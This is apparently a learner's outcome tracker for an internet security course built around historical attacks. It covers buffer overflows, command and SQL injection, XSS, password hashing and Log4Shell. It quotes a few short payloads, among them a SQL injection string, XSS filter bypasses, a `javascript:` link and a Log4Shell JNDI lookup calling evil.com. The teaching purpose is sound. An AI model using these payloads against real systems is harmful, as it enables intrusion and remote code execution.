# Internet Security — Outcome Tracker

## Solid Understanding
- **Buffer overflow mechanics**: Understands the full chain — unbounded `strcpy`/`gets` → overflow past buffer → overwrite saved frame pointer → overwrite return address → CPU jumps to attacker-chosen location. Can trace it byte by byte on the stack diagram.
- **Return address hijacking**: Correctly articulated the real attack: attacker sends executable shellcode as part of the payload, it lands at a predictable address, then the overflow redirects the return address there. This is exactly the Morris Worm technique.
- **Why C is vulnerable**: Understands C's design tradeoff — no bounds checking for performance/control, raw memory with no length metadata. Correctly contrasts with JS/Python (runtime bounds checking) and mentions safe compiler flags as a mitigation.
- **Safe vs unsafe C functions**: Can distinguish `gets` (no size limit, removed in C11) from `fgets` (takes size parameter). Correctly identified the vulnerable version in a code comparison.
- **Modern defenses (conceptual)**: Understands that ASLR+PIE defeats fixed-address exploits (experienced this firsthand when the ARM64 binary was immune), stack canaries detect overwrites, NX prevents stack execution. Knows these are mitigations, not complete fixes.

- **Command injection (shell injection)**: Understands the full pattern — user input + string concatenation + shell execution = injection. Can construct working exploit URLs. Correctly explains why `execFile()`/`subprocess.run([...])` is safe: it bypasses the shell entirely via `execve()`, passing args as `argv[]` so metacharacters are literal. Understands the difference is not escaping — it's eliminating the interpreter.
- **Parameterized APIs as the universal fix**: Grasps that command injection, SQL injection, and XSS are the same structural flaw (code and data mixed in one channel) with the same class of fix (separate channels). Articulated this independently.
- **Denylist vs allowlist**: Correctly argues against stripping semicolons — too many metacharacters, encoding bypasses, and it limits legitimate input. Understands allowlists and parameterization are the robust approach.
- **execFile() edge cases**: Identified that `execFile` can still be dangerous if the invoked program itself interprets args dangerously (e.g., a program that spawns a shell). Intuition is right, though examples could be sharper.
- **SQL injection mechanics**: Understands how string concatenation lets attacker-controlled input escape data context and inject SQL logic. Can construct working injections (`' OR '1'='1`). Correctly identifies vulnerable vs safe code (f-string concatenation vs parameterized placeholders).
- **Blind SQL injection**: Understands the character-by-character extraction technique — using SUBSTR() and a yes/no oracle to leak data one bit at a time. Ran the full exploit in hack.sh. Knows it's automatable (sqlmap).
- **ORM safety limits**: Correctly identifies that ORMs don't guarantee safety — raw SQL escape hatches and potential ORM bugs mean parameterization awareness is always needed regardless of abstraction layer.
- **XSS core mechanics**: Understands stored vs reflected XSS, can identify `dangerouslySetInnerHTML` as a vulnerability, and knows the fix is escaping output or using `textContent`. Correctly identified that single-pass denylist filters are bypassable (nested `<script>` tags, non-script tags with event handlers).
- **Filter bypass techniques**: Can craft multiple bypasses against naive denylist sanitization — both the `<img onerror>` approach and the nested-tag trick (`<scr<script>ipt>`). Understands why allowlist-based sanitization is the correct approach.
- **CSP fundamentals**: Understands that `script-src 'self'` blocks inline scripts and external-origin scripts. Correctly identified 3 of 4 CSP scenarios.

## Partial / Needs Refinement
- **Disassembly reading**: Exposed to `objdump` output and stack frame layout (sub sp, stp, etc.) but hasn't independently parsed a disassembly yet. Understands the concept (frame size, buffer offset, return address offset) but hasn't practiced it hands-on.
- **SQL comment trick (`--`)**: Missed using `--` to neutralize trailing SQL syntax in Q1. Understands the concept but didn't apply it when crafting the injection — left a dangling `%'` that would cause a syntax error.
- **CSP and inline event handlers**: Didn't realize that CSP treats event handlers (`onerror`, `onclick`) as inline scripts — they're blocked by `script-src 'self'` just like `<script>` tags. Key insight: CSP sees *all* inline JS the same way.
- **`href` XSS in React**: Missed that React doesn't sanitize URL schemes in `href` attributes — `javascript:alert('XSS')` renders as a clickable XSS link even though React auto-escapes text content.

- **Password hashing evolution**: Understands the four-level progression (plaintext → simple hash → salted hash → slow hash) and why each level fails. Correctly explains why salts defeat rainbow tables but not brute force, and why bcrypt's slowness is the key property. Knows bcrypt, scrypt, and Argon2 as the correct choices; knows never to use MD5/SHA256 for passwords.
- **Attacker economics for bcrypt**: Independently reasoned that bcrypt doesn't make cracking *impossible* — just expensive. Calculated realistic attack scenarios: spraying top-10 passwords across 1M users is feasible in days with multi-core machines. Understands that bcrypt buys time, not invincibility, and that weak passwords like `123456` are crackable regardless of hash function.
- **Defense in depth for passwords**: Understands that bcrypt alone is insufficient — you need to reject known-weak passwords at registration (breach lists), add rate limiting for online attacks, and use MFA as a second factor. Correctly identified that offline cracking bypasses server-side rate limiting entirely.
- **JWT as session optimization**: Understands that tokens exist to avoid re-authenticating on every request. Initially attributed this purely to bcrypt's cost, then refined understanding to include the broader architectural reasons (no DB round-trip, statelessness, horizontal scaling). Knows the pattern: authenticate once (pay bcrypt cost), then carry a signed token.

- **Patch management failures (Equifax)**: Understands how a known, patched vulnerability (Apache Struts CVE-2017-5638) led to a catastrophic breach purely due to organizational failure to apply updates. Grasps that the vulnerability was public for months before exploitation.
- **Kill switch / domain sinkholing (WannaCry)**: Appreciates Marcus Hutchins' discovery — the unregistered domain that acted as WannaCry's kill switch. Understands the concept of a domain check as a sandbox-evasion technique that accidentally became a global off-switch.
- **Log4Shell mechanics**: Understands how JNDI lookup interpolation in log message *content* (not just config) turned `logger.info("User: " + input)` into an RCE vector. Grasps that `${jndi:ldap://evil.com/payload}` triggers an outbound LDAP connection, downloads a Java class, and executes it.
- **JNDI design rationale**: Understands *why* the feature existed — enriching log output with runtime context (hostname, environment) from JNDI naming services — and that the mistake was not distinguishing trusted config from untrusted logged data.
- **Unifying pattern across the course**: Independently connected Log4Shell to the same structural flaw from lessons 2, 3, and 4: untrusted data interpreted as code in the same channel. SQL injection (user input parsed as SQL), XSS (user input parsed as HTML), Log4Shell (user input parsed as Log4j expressions) — same bug class, same fix principle.

## Gaps — Not Yet Covered
- Supply chain / dependency attacks (touched on in discussion of Sep 2025 npm attack, but no dedicated lesson)
- Trust boundaries and input validation (meta-concept — though demonstrated implicitly across all lessons)

## Lessons Completed
- [x] 01 — The Morris Worm (1988) — quiz passed, exploit exercise completed
- [x] 02 — The PHF CGI Attack (1996) — quiz passed
- [x] 03 — SQL Injection (2000) — quiz passed, blind injection exercise completed
- [x] 04 — The Samy Worm / XSS (2005) — quiz passed
- [x] 05 — The RockYou Breach (2009) — quiz skipped, concepts demonstrated in discussion
- [x] 06 — Heartbleed (2014) — lesson read, quiz skipped
- [x] 07 — Equifax & WannaCry (2017) — lesson read, quiz skipped
- [x] 08 — Log4Shell (2021) — lesson read, quiz skipped, JNDI design rationale discussed
